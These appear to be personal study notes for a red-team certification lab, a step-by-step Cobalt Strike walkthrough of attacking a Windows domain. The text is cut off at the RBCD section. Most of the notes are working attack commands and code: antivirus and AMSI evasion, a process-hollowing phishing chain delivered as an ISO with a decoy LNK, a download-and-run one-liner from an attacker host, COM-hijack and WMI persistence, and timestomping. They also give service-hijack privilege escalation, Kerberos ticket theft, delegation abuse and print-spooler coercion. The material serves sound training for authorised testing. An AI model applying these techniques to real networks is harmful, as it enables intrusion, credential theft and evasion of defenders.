# CRTO  Notes&#32;

## 1. Defence Evasion - Make Beacon Invisible

Defender will catch default Cobalt Strike in seconds. So before doing anything on the target, we change three things. The C2 profile tells Beacon how to behave in memory and talk back to us. The Artifact Kit changes how our EXE/DLL payloads look on disk. The Resource Kit changes how PowerShell payloads look. Change all three or Defender eats your beacon.

### Malleable C2 Profile

SSH into the team server, open the profile file. Three blocks matter:

**Stage block** - this is how Beacon sits in memory. If you leave defaults, Defender spots the shellcode pattern instantly:

```
stage {
    set userwx "false";       // no RWX memory (looks suspicious)
    set cleanup "true";       // clean up after injection
    set copy_pe_header "false"; // don't copy PE header
    set module_x64 "Hydrogen.dll"; // fake module name

    transform-x64 {
        strrep "beacon.x64.dll" "bacon.x64.dll";  // rename telltale strings
        // ... more string replacements to remove signatures
    }
}
```

**Post-ex block** - when Beacon runs post-exploitation commands, it forks a new process by default. That fork is what Defender watches. So we tell it to use a process that already exists on the box:

```
post-ex {
    set spawnto_x64 "%windir%\\sysnative\\werfault.exe"; // blend in
    set cleanup "true";
    set amsi_disable "true";  // bypass AMSI
    set thread_hint "ntdll.dll!RtlUserThreadStart+0x2c"; // fake call stack
}
```

**Process-inject block** - when Beacon needs to inject code into another process (like for keylogging or screenshots), this controls the technique. Default CreateThread gets flagged, so we switch to NtQueueApcThread-s or SetThreadContext:

```
process-inject {
    set allocator "VirtualAllocEx";
    set startrwx "false";  // never start with RWX
    set userwx "false";
}
```

After saving, restart the team server: `sudo /usr/bin/docker restart cobaltstrike-cs-1`

### Artifact Kit - Custom EXE/DLL Payloads

Defender has signatures for the default decryption loop in Cobalt Strike payloads. The Artifact Kit lets us change that loop so the EXE/DLL doesn't match any known signature.

Open `patch.c` and replace the standard `for` loops with reverse `while` loops. This breaks the byte pattern Defender looks for:

```
x = length;
while ( x-- ) {
    *((char *)buffer + x) = *((char *)buffer + x) ^ key[x % 8];
}
```

Build with: `./build.sh mailslot VirtualAlloc 351363 0 false false none /path/to/custom-artifacts`

Then load `artifact.cna` in Cobalt Strike's Script Manager.

### Resource Kit - Custom PowerShell Payloads

PowerShell stager templates also have known signatures. Two files to fix:

1. **template.x64.ps1** - Break up strings that Defender signatures look for (e.g. split `System.dll` into `Sys` + `tem.dll`), and rewrite the `WriteProcessMemory` call to use `GetDelegateForFunctionPointer`
2. **compress.ps1** - Obfuscate the compression/decompression wrapper using randomised casing and string concatenation

Load `resources.cna` in Script Manager.

### Testing

Host a PowerShell web delivery payload, download it on the target workstation, and verify Beacon checks in without Defender killing it. Then test lateral movement with `jump psexec64` to confirm service EXE payloads also survive.

## 2. Initial Access - Getting the First Beacon

**We need someone on the target network to run our payload. When they do, it spawns a hidden Edge process and injects Beacon shellcode into it. From the outside it looks like Edge running normally. The chain goes: Shellcode goes into a DLL (AppDomain Hijack), that DLL gets loaded by a legit Microsoft binary (ngentask.exe), a LNK shortcut triggers it, a decoy spreadsheet covers the execution, everything is packed in an ISO, and the ISO is served from a cloned website**.

### Step 1 - Generate Shellcode

In Cobalt Strike: Payloads > Windows Stageless Payload > Listener: http > Output: Raw. Save it as `http_x64.xprocess.bin`. Stageless means the whole beacon is in one blob, no second download needed.

### Step 2 - Build the Malicious DLL (AppDomain Hijack)

Make a Class Library (.NET Framework) project called `AppDomainHijack`. Drop the shellcode file in as an Embedded Resource.

What the C# code actually does is **process hollowing**. So basically:

1. Spawns `msedge.exe` as a hidden, suspended process
2. Reads the PEB to find the image base address
3. Parses the PE headers to find the entry point
4. Overwrites the entry point with Beacon shellcode
5. Resumes the thread → Beacon runs inside Edge

The class inherits from `AppDomainManager`. That means any .NET app that loads this DLL via environment variables will automatically run our code. No user interaction needed after the initial trigger.

Build in Release mode → copy DLL to `C:\Payloads\deals\`

### Step 3 - The Legit Sideload Binary

We need a legit .NET binary to sideload our DLL. `ngentask.exe` from the SxS folder is perfect because it's Microsoft-signed and already on every Windows box. Copy it into the deals folder:

```
cp C:\Windows\WinSxS\amd64_netfx4-ngentask_exe_...\ngentask.exe C:\Payloads\deals\
```

**Quick test**: set the APPDOMAIN environment variables, run ngentask.exe manually. If your DLL loads and Beacon checks in, the sideload works.

```
$env:APPDOMAIN_MANAGER_TYPE = 'AppDomainHijack.DomainManager'
$env:APPDOMAIN_MANAGER_ASM = 'AppDomainHijack, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null'
.\ngentask.exe
```

### Step 4 - Create a Decoy

Make a fake `deals.xlsx` with some dummy data (product names, discounts, whatever). This is what the user actually sees open, so they think they got a real file and don't get suspicious.

### Step 5 - Build the LNK Trigger

The `.lnk` shortcut does two things at once: opens the decoy spreadsheet so the user sees something normal, and runs the payload through a hidden base64 PowerShell command in the background:

```
$lnk.TargetPath = "%COMSPEC%"
$lnk.Arguments = "/C start deals.xlsx && powershell -w hidden -enc $enc"
$lnk.IconLocation = "%ProgramFiles%\Microsoft Office\root\Office16\EXCEL.EXE,0"
```

The icon is set to look like an Excel file.

### Step 6 - Package into an ISO

Use PackMyPayload to bundle everything into an ISO, hiding all files except the LNK trigger:

```
python3 PackMyPayload.py -H deals.xlsx,ngentask.exe,AppDomainHijack.dll /path/deals/ /path/deals/deals.iso
```

When the user mounts the ISO they only see `deals.xlsx` (which is actually the LNK in disguise). Everything else is hidden.

### Step 7 - Deliver via Cloned Website

1. Host the ISO on Cobalt Strike's web server
2. Clone a legitimate deals page
3. Victim visits the cloned page → ISO downloads → mounts → double-clicks trigger → decoy opens + Beacon checks in from `msedge.exe` as the target user

### Practical Note: iwr Delivery Works Fine

The AppDomain hijack chain above is the full lab approach. But in practice, if your Artifact Kit and profile are properly built, a simple `iwr` download and execute works fine even with Defender on:

```
iwr http://10.0.0.5/run.exe -OutFile C:\Windows\run.exe
if ($?) { explorer.exe C:\Windows\run.exe }
```

Why drop to `C:\Windows\`? AppLocker allows `%WINDIR%\*` but blocks `%WINDIR%\Temp\*`, `%WINDIR%\Tasks\*`, `%SYSTEM32%\spool\*`. So drop directly in `C:\Windows\` or `C:\Windows\Tracing\` and AppLocker lets it run.

Why `explorer.exe` as the launcher? Clean parent process tree. Also if PowerShell is in Constrained Language Mode because of AppLocker, `New-Object Net.WebClient` is blocked but `iwr` is a built-in cmdlet so it still works.

The evasion comes from the build (patched Artifact Kit + proper profile loaded after restart), the delivery method is secondary.

## 3. Persistence - Surviving Reboots with COM Hijacking

**So we have a Beacon running. Problem is, if the user logs off or the box reboots, it's gone. We need it to come back automatically on login. But we can't use Startup folders or Run keys because defenders check those first**.

Instead we use **COM hijacking**. How it works: Windows apps load COM objects by looking up CLSIDs in the registry. If we create a per-user registry entry that points a CLSID to our DLL instead of the real one, our code runs every time that app starts. Windows checks the user key first, so we don't even need admin.

### Microsoft Teams

Teams starts automatically on login for most corporate users. It loads a COM object with CLSID `{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}`. We hijack that CLSID so every time Teams launches (every login), our payload runs instead.

### Step 1 - Build the Payload DLL

Make a Beacon DLL:

- Payloads → Windows Stageless Payload → Listener: http → Output: Windows DLL → save as `http_x64.dll`

### Step 2 - Plant the DLL

Upload the DLL to the target. Rename it to look like a legit Teams file so it blends in:

```
cd C:\Users\rsteel\AppData\Local\Microsoft\TeamsMeetingAddin\
mkdir 1.0.22339.6
cd 1.0.22339.6
upload C:\Payloads\http_x64.dll Microsoft.Teams.HttpClient.dll
```

Path and filename look like normal Teams stuff. Nobody double-checks.

### Step 3 - Timestomp the DLL

Change the DLL's timestamps to match a legit file so it doesn't look fresh-dropped in a forensic timeline:

```
timestomp Microsoft.Teams.HttpClient.dll C:\Windows\System32\ntdll.dll
```

Now our DLL has the same timestamps as ntdll.dll. Looks like it's been there forever.

### Step 4 - Create the COM Hijack Registry Key

Create the per-user registry key that redirects the CLSID to our DLL:

```
reg add "HKCU\SOFTWARE\Classes\CLSID\{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}\InProcServer32" /v "" /t REG_SZ /d "C:\Users\rsteel\AppData\Local\Microsoft\TeamsMeetingAddin\1.0.22339.6\Microsoft.Teams.HttpClient.dll" /f
```

**Why HKCU?** Per-user keys beat machine-wide keys (HKLM) for COM lookups. No admin rights needed to write here.

### Step 5 - Verify

Reboot the box. User logs in, Teams auto-starts, looks up the CLSID, finds our HKCU entry first, loads our DLL, Beacon checks in.

### Cleanup

To undo persistence, just delete the registry key:

```
reg delete "HKCU\SOFTWARE\Classes\CLSID\{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}" /f
```

## 4. Privilege Escalation - From User to SYSTEM

Right now we're just a normal user. Can't dump creds, can't install elevated persistence. We need **SYSTEM** or local admin to do anything real.

### The Vulnerability: Weak Service Registry Permissions

Every Windows service stores its config in the registry under `HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName>`. Normally only admins can touch these. But sometimes a service is misconfigured and gives **FullControl** to low-priv users. That means we can change what binary the service runs.

### Step 1 - Find Vulnerable Services

Run this PowerShell one-liner (via `powershell-import` or inline) to check every service's ACL:

```
Get-Acl -Path "HKLM:\System\CurrentControlSet\Services\*" |
  Format-List PSChildName, Access -Force |
  Out-File C:\Temp\service-acls.txt
```

Look for your user or group having `FullControl`. In the lab: **BadWindowsService** gives FullControl to Authenticated Users. That's our target.

### Step 2 - Check the Current Binary Path

```
Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\Services\BadWindowsService" |
  Select-Object -ExpandProperty ImagePath
```

It points to some legit EXE right now. We're going to swap it.

### Step 3 - Generate a Service Payload

Make a Windows Service EXE Beacon:

- Payloads → Windows Stageless Payload → Listener: http → Output: Windows Service EXE → save as `svc_x64.exe`

Upload it to the target:

```
upload C:\Payloads\svc_x64.exe C:\Temp\svc_x64.exe
```

### Step 4 - Swap the Binary Path

Change the service's ImagePath to point to our payload:

```
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Services\BadWindowsService" -Name ImagePath -Value "C:\Temp\svc_x64.exe"
```

### Step 5 - Restart the Service

```
net stop BadWindowsService
net start BadWindowsService
```

Service starts, runs our EXE, **Beacon checks in as SYSTEM**. We're elevated.

### How it works

Services run as SYSTEM by default. We just swapped what binary it runs. The weak ACL on the registry key is what made the whole thing possible. Without `FullControl`, we couldn't touch `ImagePath`.

## 5. Elevated Persistence - WMI Event Subscription

We're SYSTEM now, but that Beacon still dies on reboot. We need **elevated persistence** that auto-runs as SYSTEM every time the box comes back up. Scheduled tasks are noisy. WMI is quieter.

**WMI Event Subscriptions** let us tell Windows: "when this event happens, run this program." The subscription lives inside the WMI repository, not the filesystem or registry. Harder for defenders to spot.

### The Trigger Event

We hook into **Group Policy refresh events** (Event ID 1502). GPO refresh happens automatically every \~90 minutes and at startup. Natural, frequent, guaranteed to fire our payload regularly.

### Step 1 - Generate a DNS Beacon Payload

Why DNS? It's a backup channel. If HTTP gets blocked, DNS Beacon talks over DNS queries. Slower but way harder to block.

- Payloads → Windows Stageless Payload → Listener: dns → Output: Windows EXE → save as `dns_x64.exe`

Upload and disguise it:

```
upload C:\Payloads\dns_x64.exe C:\Windows\windbg.exe
```

Naming it `windbg.exe` (Windows Debugger) makes it blend in with system tools. Nobody questions it.

### Step 2 - Import the WMI Persistence Script

Load the helper script into Beacon:

```
powershell-import C:\Tools\WMI-Persistence.ps1
```

This gives you `Add-WmiPersistence` and `Remove-WmiPersistence` functions.

### Step 3 - Install the Subscription

```
powershell Add-WmiPersistence
```

This creates three WMI objects:

1. **EventFilter** - watches for Event ID 1502 (GPO refresh) in the GroupPolicy event log
2. **EventConsumer** - defines what to run: `C:\Windows\windbg.exe` (our DNS Beacon)
3. **FilterToConsumerBinding** - links the filter to the consumer

### Step 4 - Verify

Reboot the box. Startup happens, GPO refreshes, Event 1502 fires, WMI consumer runs `windbg.exe`, DNS Beacon checks in as SYSTEM.

### Cleanup

```
powershell Remove-WmiPersistence
```

Removes all three WMI objects (filter, consumer, binding).

## 6. Discovery - Mapping the Domain with BOFHound & BloodHound

Before moving to other machines, we need to know the lay of the land. Who has access to what, which machines trust which, where the domain admins are. SharpHound (the standard collector) works but it's noisy and EDR catches it. **BOFHound** does the same thing without getting flagged.

### BOFHound over SharpHound

SharpHound runs a full .NET assembly that queries every AD object at once. EDR spots it instantly. BOFHound works differently:

1. We run individual LDAP queries via Beacon Object Files (BOFs). Each query looks like normal admin activity
2. BOFHound parses the Cobalt Strike logs offline and converts them into BloodHound-compatible JSON
3. Same graph analysis, much less noise

### Step 1 - Run LDAP Queries via BOFs

Run these LDAP queries one at a time. Each one grabs specific object types with their security descriptors:

```
ldapsearch (objectCategory=domain) cn,dc,objectSid,objectGUID,ms-DS-MachineAccountQuota,msDS-Behavior-Version,nTSecurityDescriptor

ldapsearch (objectCategory=organizationalUnit) name,ou,objectGUID,nTSecurityDescriptor

ldapsearch (objectCategory=groupPolicyContainer) displayName,cn,gPCFileSysPath,objectGUID,nTSecurityDescriptor

ldapsearch (&(objectCategory=person)(objectClass=user)) cn,sAMAccountName,objectSid,objectGUID,userAccountControl,memberOf,servicePrincipalName,msDS-AllowedToDelegateTo,msDS-AllowedToActOnBehalfOfOtherIdentity,adminCount,nTSecurityDescriptor

ldapsearch (objectCategory=group) cn,member,objectSid,objectGUID,adminCount,nTSecurityDescriptor

ldapsearch (objectCategory=computer) cn,sAMAccountName,dNSHostName,objectSid,objectGUID,userAccountControl,operatingSystem,memberOf,msDS-AllowedToDelegateTo,msDS-AllowedToActOnBehalfOfOtherIdentity,servicePrincipalName,nTSecurityDescriptor
```

**Key field**: `nTSecurityDescriptor` is the ACL on each object. It tells us who can modify what. That's how we find attack paths.

### Step 2 - Parse Logs with BOFHound

Download the Beacon console log and feed it to BOFHound:

```
pip3 install bofhound
bofhound --input beacon_log.txt --output /opt/bofhound/
```

Out comes BloodHound-compatible JSON files.

### Step 3 - Import into BloodHound

Drop the JSON files into BloodHound Community Edition. Key queries to run:

**Find shortest path to Domain Admin:**

```cypher
MATCH p=shortestPath((u:User)-[*1..]->(g:Group))
WHERE g.name STARTS WITH "DOMAIN ADMINS"
RETURN p
```

**Find GPO-based restricted groups (who gets local admin via GPO):**

Check GPO restricted group membership. If a domain group is pushed into local Administrators on servers via GPO, compromising that group = admin on all those servers.

```cypher
MATCH (g:GPO)-[:GpLink]->(ou:OU)-[:Contains*1..]->(c:Computer)
WHERE g.name CONTAINS "YOURPOLICY"
RETURN g, ou, c
```

### What to Look For

- Users with **SPNs** (Kerberoastable)
- Machines with **unconstrained delegation** (userAccountControl flag 524288)
- Machines with **constrained delegation** (msDS-AllowedToDelegateTo populated)
- Objects where your compromised user has **WriteDacl**, **GenericAll**, **WriteProperty** - these are your lateral movement paths
- **AdminCount=1** users - they have (or had) admin privileges

## 7. Credential Access & User Impersonation - Stealing Kerberos Tickets

BloodHound showed us who to go after. But to reach those targets, we need to become another user. No password cracking needed. We just steal their **Kerberos tickets** straight from memory.

### How Kerberos Works (Simplified)

When a user logs in, the DC gives them a **TGT** (Ticket Granting Ticket). It proves who you are to everything. It proves who you are and you trade it for service tickets to access stuff. If we steal someone's TGT, we become them on the network.

### Step 1 - List Cached Tickets

Check what Kerberos tickets are cached on this box:

```
execute-assembly C:\Tools\Rubeus\Rubeus.exe triage
```

Or via BOF:

```
krb_triage
```

Shows all tickets in all logon sessions. Look for `krbtgt` entries. Those are TGTs.

### Step 2 - Dump a Specific User's TGT

Found a `krbtgt` ticket for someone interesting (like `rsteel`)? Grab it:

```
krb_dump /user:rsteel /service:krbtgt
```

Extracts the TGT as a base64 `.kirbi` blob. Save it to a file on the team server.

### Step 3 - Create a Sacrificial Logon Session

Don't inject the stolen ticket into your current session or you'll break your existing access. Make a new empty logon session instead:

```
make_token DEV\rsteel FakePasswordDoesntMatter
```

This makes a **network logon** (type 9) with fake creds. The password doesn't matter because we're about to inject a real ticket into it.

### Step 4 - Inject the Stolen TGT

```
kerberos_ticket_use C:\Payloads\rsteel.kirbi
```

Now our Beacon's network identity is `rsteel`. Anything we do over the network (file shares, LDAP, whatever) uses rsteel's TGT.

### Step 5 - Verify Access

```
ls \\lon-fs-1\c$
```

If `rsteel` has admin on `lon-fs-1`, you'll see the C$ share contents. We just became that user **without knowing their password**.

### The payoff

- No password cracking needed
- No authentication logs showing a "login" because we're using a ticket that was already legitimately issued
- Works even if the user has changed their password since the ticket was issued (tickets are valid until they expire)

## 8. Lateral Movement - SCShell (Fileless Service Execution)

We can **steal tickets and become other users. Now we need to actually get onto their machines. Tools like PSExec work but they create new services and drop files on disk. Defenders catch that straightaway. SCShell is better because it's fileless. It takes a service that already exists on the target, temporarily swaps its binary path to our payload, triggers it, then puts the original path back. No new service created, nothing on disk**.

### SCShell

- No new service created (avoids Sysmon Event ID 7045)
- No file dropped on disk
- Modifies an existing service temporarily, then changes it back
- Uses the Service Control Manager (SCM) over named pipes, looks like normal admin activity

### Step 1 - Set the SpawnTo

Before we jump to another machine, we tell Cobalt Strike which process to spawn the new Beacon into on the target:

```
ak-settings spawnto_x64 C:\Windows\System32\dllhost.exe
```

We pick `dllhost.exe` because it's a normal Windows process. Blends right in.

### Step 2 - Jump via SCShell

```
jump scshell64 lon-fs-1 http
```

What SCShell actually does:

1. Connects to the target's Service Control Manager (SCM) via RPC
2. Picks an existing service
3. Saves its original binary path
4. Changes the binary path to a Beacon payload command
5. Starts the service → Beacon executes on the remote machine
6. Restores the original binary path

New Beacon pops up on `lon-fs-1`, running as the service account. No files dropped, no new services created.

### SCShell vs Other Methods

- **SCShell**: Best for stealth. No files on disk, reuses an existing service. Requires admin access on the target.
- **WMI**: Good alternative, also fileless. Creates a process via WMI.
- **PSExec**: Noisiest. Creates a service, drops an EXE. Use only when stealth doesn't matter.
- **WinRM**: Uses PowerShell remoting. Requires WinRM enabled on target.

### Recovering Dead SMB Chains

SMB beacons work in chains. Parent talks to child, child talks to grandchild, and so on. Problem is, if the parent beacon dies, every beacon below it goes orphan. The processes are still running and the pipes are still there, but nothing you send reaches them because the relay is broken.

How to fix it:

1. Find your surviving HTTP beacon (HTTP beacons call home independently, SMB beacons depend on the chain)
2. If you know the orphaned beacon's pipe name (from the jump tasking output, e.g. `\\\\.\\.pipe\\dotnet-diagnostic-1234`), try adopting it:

   ```
   link <child-ip> <pipe-name>
   ```
3. If adoption fails, rebuild the chain from the HTTP beacon using stored tickets or credentials

Big takeaway: always keep an HTTP beacon alive at the top of every chain. HTTP beacons call home on their own. SMB beacons can't. Treat SMB chains as disposable. If one breaks, don't panic. Rebuild from your HTTP beacon onto a server host instead of trying to push SMB across VLANs from a workstation.

### Jump by IP When DNS Fails

If you see `64 - ERROR_NETNAME_DELETED` when you do `ls \\hostname\c$`, that's a torn connection, not an auth problem. Auth failure shows `5 - ERROR_ACCESS_DENIED`. Don't keep retrying from the same beacon. Instead:

- Move to a different beacon/host that can reach the target
- Jump by IP instead of hostname
- Rebuild the chain from your HTTP beacon

## 9. SOCKS Proxy & Domain Enumeration - Tunneling AD Tools Through Beacon

Some tools **just work better from your own Windows machine. Rubeus, Certify, PowerShell AD modules. Problem is, your attack box can't reach the internal network directly. So we tunnel through Beacon. We start a SOCKS proxy on our Beacon, point Proxifier at it, and now our local tools talk to the target network as if we're sitting inside it**.

### Step 1 - Start a SOCKS Proxy on Beacon

```
socks 1080 socks5
```

This opens port 1080 on the team server. All traffic sent to that port gets tunneled through the Beacon into the target network.

### Step 2 - Configure Proxifier on Your Windows Attack Machine

1. Open Proxifier → Profile → Proxy Servers → Add: `127.0.0.1:1080` (or team server IP), SOCKS5
2. Profile → Proxification Rules: Create rules so that only specific tools go through the proxy (e.g., `powershell.exe`, `rubeus.exe`, `certify.exe`)
3. Set the default rule to **Direct** (don't proxy everything)

### Step 3 - Fix DNS Resolution

Proxifier can't resolve internal hostnames like `lon-dc-1.yourlab.local`. So we add them manually in the hosts file:

```
# C:\Windows\System32\drivers\etc\hosts
10.10.1.1    lon-dc-1.yourlab.local
10.10.1.2    lon-fs-1.yourlab.local
```

### Step 4 - Get a Kerberos Ticket for LDAP

AD tools need a valid Kerberos ticket to talk to the DC. We use Rubeus to grab one:

```
Rubeus.exe asktgs /service:LDAP/lon-dc-1.yourlab.local /user:rsteel /domain:yourlab.local /rc4:<hash> /ptt
```

`/ptt` means Pass The Ticket. It injects the ticket straight into your current session so you don't have to do anything else.

### Step 5 - Run AD Tools Through the Proxy

Now your local PowerShell AD cmdlets work like you're on the internal network:

```powershell
Get-ADDomain
Get-ADComputer -Filter * | Select Name, DNSHostName
Get-ADUser -Filter {AdminCount -eq 1} -Properties MemberOf
```

**The traffic path: your machine goes to Proxifier, Proxifier sends it through SOCKS, SOCKS goes through Beacon, Beacon forwards it into the target network, hits the Domain Controller. All invisible to the target**.

### SOCKS Proxy

- Some tools don't have BOF versions
- Interactive tools (like BloodHound GUI, AD RSAT snap-ins) need a real Windows session
- Easier to run multiple queries and iterate quickly
- Keeps heavy tool execution off the target machine (better OPSEC)

## 10. Unconstrained Delegation - Catching TGTs from Trusting Machines

**So you've moved laterally to a few machines, but none of the users you've stolen tickets from are domain admins. You need someone bigger. Some machines in AD have unconstrained delegation turned on. What that means: when any user authenticates to that machine, their full TGT gets cached on it. So if we land on one of those machines, we can grab TGTs from anyone who connects. I**ncluding domain admins.

### Unconstrained Delegation Background

It was built for multi-tier apps. Like, a web server needs to hit a database on behalf of the user, so it needs the user's TGT to request a service ticket to the DB. The flaw: the web server caches that TGT in memory. Anyone with admin on that box can pull it out.

### Step 1 - Find Unconstrained Delegation Machines

LDAP query finds them. The flag 524288 means TRUSTED\_FOR\_DELEGATION:

```
ldapsearch (&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288)) cn,dNSHostName
```

DCs always have this flag. Ignore those. What you want is non-DC machines with unconstrained delegation. Those are the interesting targets.

### Step 2 - Compromise the Delegation Machine

Get onto that machine. SCShell, WMI, whatever works. You need a Beacon running on it.

### Step 3 - List Cached TGTs

Now check what TGTs are sitting in memory:

```
krb_triage
```

Look for `krbtgt` tickets from domain admins or high-value service accounts. Those are the ones we want.

### Step 4 - Extract the TGT

```
krb_dump /user:targetadmin /service:krbtgt
```

Copy the base64 kirbi blob. That's the ticket.

### Step 5 - Use It

Same flow as Section 7. Create a sacrificial logon session, inject the stolen TGT:

```
make_token DEV\targetadmin FakePassword
kerberos_ticket_use C:\Payloads\targetadmin.kirbi
```

You're now operating as that domain admin. Full access.

### The tricky part

**Think of unconstrained delegation machines as TGT magnets. Anyone who touches them leaves their master key behind. That's why in every AD assessment, you check for these first. If one exists and you can get on it, you might skip lot of lateral movement steps and go straight to domain admin**.

## 11. Constrained Delegation - S4U2proxy to Targeted Services

Constrained vs unconstrained: unconstrained delegation machines cache everyone's TGT, so you just sit and wait. But those are rare. Constrained delegation is way more common. The machine can only delegate to specific services listed in its `msDS-AllowedToDelegateTo` attribute. It's more restricted, but we can still abuse it to impersonate any user to those specific services.

### How Constrained Delegation Works

The protocol **behind it is S4U2proxy (Service for User to Proxy). The normal flow**:

1. Machine A has `msDS-AllowedToDelegateTo: cifs/lon-fs-1`
2. A user authenticates to Machine A
3. Machine A uses S4U2proxy to request a service ticket to `cifs/lon-fs-1` **on behalf of that user**
4. Machine A accesses the file server as the user

The abuse: if we own Machine A, we can use S4U2proxy to request a service ticket to `cifs/lon-fs-1` as any user we want. Domain admin? Sure. We just tell the DC "this admin wants to access that file server" and the DC believes us because Machine A is trusted to delegate.

### Step 1 - Find Constrained Delegation Machines

```
ldapsearch (&(objectCategory=computer)(msDS-AllowedToDelegateTo=*)) cn,msDS-AllowedToDelegateTo,userAccountControl
```

Also look for the `TRUSTED_TO_AUTH_FOR_DELEGATION` flag (16777216) in userAccountControl. If a machine has this, it can do "protocol transition" (S4U2self). That means it can get a ticket on behalf of a user even if that user never logged into it. Even more powerful.

### Step 2 - Get the Machine's TGT

You need a SYSTEM Beacon on the constrained delegation machine. Then grab the machine account's TGT:

```
krb_dump /luid:3e7 /service:krbtgt
```

`/luid:3e7` is the SYSTEM logon session. It always has the machine's own TGT sitting in it.

### Step 3 - Perform S4U2proxy

Now use that machine TGT to request a service ticket impersonating a domain admin:

```
krb_s4u /targetuser:Administrator /service:cifs/lon-fs-1 /ticket:<base64 machine TGT>
```

This gives us a service ticket for `cifs/lon-fs-1` as `Administrator`..

### Step 4 - Use the Ticket

```
make_token DEV\Administrator FakePassword
kerberos_ticket_use <service ticket kirbi>
ls \\lon-fs-1\c$
```

Admin access to `lon-fs-1` as Administrator. No password needed. The delegation did all the work.

### Why It Works

Constrained delegation trusts the machine to **only delegate to listed services. But it never checks if the user actually authenticated. So if we own the machine, we own the delegation. We pick who to impersonate**.

### Faster Path: Dump the Machine TGT Directly

You don't need to run `monitor` mode or coerce authentication. Just grab the machine's TGT straight from the SYSTEM session:

```
execute-assembly Rubeus.exe triage
```

Find LUID `0x3e7` (SYSTEM) with `krbtgt` as the server name. That's the machine's own TGT. Dump it:

```
execute-assembly Rubeus.exe dump /luid:0x3e7 /service:krbtgt /nowrap
```

Feed that into `s4u` as the `/ticket:` parameter. Same result, fewer steps, skip the coercion entirely.

## 12. Service Name Substitution - Swapping Service Types in Delegation Tickets

Suppose you found a constrained delegation machine (Section 11), but the allowed service is something useless like `time/lon-fs-1`. Time sync doesn't help us. We want `cifs` (file shares) or `ldap` (AD queries). Service name substitution lets us swap the service type in the ticket so we can access what we actually need.

### The Trick

**The service ticket has a service name field (the SPN), but the target machine never actually checks it. The ticket is encrypted with the target machine's key. The machine only verifies the ticket is valid and who the user is. It doesn't care if the service name says "time" or "cifs"**.

So we request a ticket for `time/lon-fs-1` (which we're allowed to do), then swap the service name from `time` to `cifs`. The ticket still works because the encryption key is the same. It's the machine's key, not the service's key.

### Step 1 - Identify the Allowed Service

From your constrained delegation scan (Section 11), you found something like:

```
msDS-AllowedToDelegateTo: time/lon-fs-1
```

### Step 2 - S4U with /altservice

Use `krb_s4u` with the `/altservice` flag. This tells it to swap the service name in the ticket:

```
krb_s4u /targetuser:Administrator /service:time/lon-fs-1 /altservice:cifs /ticket:<base64 machine TGT>
```

It requests the ticket for `time/lon-fs-1` (allowed by the delegation config) but swaps the service name to `cifs` in the final ticket.

### Step 3 - Use It

```
make_token DEV\Administrator FakePassword
kerberos_ticket_use <service ticket kirbi>
ls \\lon-fs-1\c$
```

Full file access as Administrator, even though the delegation config only said `time`. The service name was just cosmetic.

### So what

Defenders look at constrained delegation and think "it can only delegate to the time service, that's harmless." Wrong. Because the target never checks the service name, any constrained delegation entry is effectively delegation to every service on that machine. The service name is decoration. What actually matters is which machine you can delegate to.

## 13. S4U2self - Forcing Authentication with the Print Spooler

Y**ou're on an unconstrained delegation machine (Section 10) but no useful TGTs are sitting in memory. Nobody interesting has logged in recently. So instead of waiting, we force a high-value target like the domain controller to authenticate to our machine. Its TGT gets cached, and we grab it**.

### The Attack Flow

1. Set up Rubeus in **monitor mode** on the unconstrained delegation machine to watch for incoming TGTs
2. Use **SharpSpoolTrigger** to coerce the domain controller into authenticating to our machine
3. The DC's TGT gets cached on our machine → Rubeus catches it
4. Use S4U2self with the DC's TGT to get a service ticket to the DC as Administrator

### Step 1 - Start Rubeus Monitor

On the unconstrained delegation machine, start Rubeus watching for incoming TGTs:

```
execute-assembly C:\Tools\Rubeus\Rubeus.exe monitor /interval:5 /nowrap /targetuser:LON-DC-1$
```

This checks every 5 seconds for new TGTs from `LON-DC-1$` (the DC's machine account). It's just sitting there waiting.

### Step 2 - Trigger the Print Spooler

From a different Beacon, poke the DC's Print Spooler:

```
execute-assembly C:\Tools\SharpSpoolTrigger\SharpSpoolTrigger.exe lon-dc-1 lon-delegation-machine
```

SharpSpoolTrigger abuses the Print Spooler (`MS-RPRN`) service. It tells the DC "hey, send a print notification to this machine." The DC goes to authenticate using its machine account, Kerberos kicks in, and boom, its TGT lands in memory on our delegation machine.

### Step 3 - Capture the TGT

Rubeus catches the DC's TGT. Copy that base64 ticket blob.

### Step 4 - S4U2self + altservice

Now **we have the DC's own TGT. Use it to request a service ticket to the DC itself,** as Administrator:

```
krb_s4u /self /altservice:cifs/lon-dc-1 /impersonateuser:Administrator /ticket:<base64 DC TGT>
```

`/self` is S4U2self. The DC requests a ticket on behalf of Administrator to itself. `/altservice:cifs/lon-dc-1` swaps the service name so we get file access to the DC.

### Step 5 - Use It

```
make_token DEV\Administrator FakePassword
kerberos_ticket_use <service ticket kirbi>
ls \\lon-dc-1\c$
```

**File access to the domain controller as Administrator.**

### Impact

Three "by design" features chained together: the spooler trick forced the DC to authenticate, unconstrained delegation cached its TGT, and S4U2self let us impersonate Administrator on the DC. Each feature is working as intended. Together they give you full domain compromise.

## 14. Resource-Based Constrained Delegation (RBCD) - Writing Your Own Delegation Rights

You don't have admin on any machine with constrained or unconstrained delegation. But you found a machine where your user has WriteProperty on its AD object. That's enough. RBCD flips the delegation model. Instead of the source machine saying "I can delegate to X," the target machine says "X can delegate to me." That config lives in `msDS-AllowedToActOnBehalfOfOtherIdentity`. If we can write to that attribute, we write ourselves in and grant our own delegation rights.

### Prerequisites

1. **WriteProperty** on the target's `msDS-AllowedToActOnBehalfOfOtherIdentity` (ObjectAceType GUID: `3f78c3e5-f79a-46bd-a0b8-9d18116ddc79`)
2. A computer account we control (every domain user can create up to 10 machine accounts by default via `ms-DS-MachineAccountQuota`)

### Step 1 - Find Targets (via SOCKS + AD Tools)

Set up SOCKS (Section 9) and use PowerView through it. Find machines where your user has WriteProperty:

```powershell
Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs |
  Where-Object { $_.ActiveDirectoryRights -match 'WriteProperty' -and
                 $_.ObjectAceType -eq '3f78c3e5-f79a-46bd-a0b8-9d18116ddc79' }
```

Any machine that shows up here is a potential RBCD target.

### Step 2 - Configure RBCD on the Target

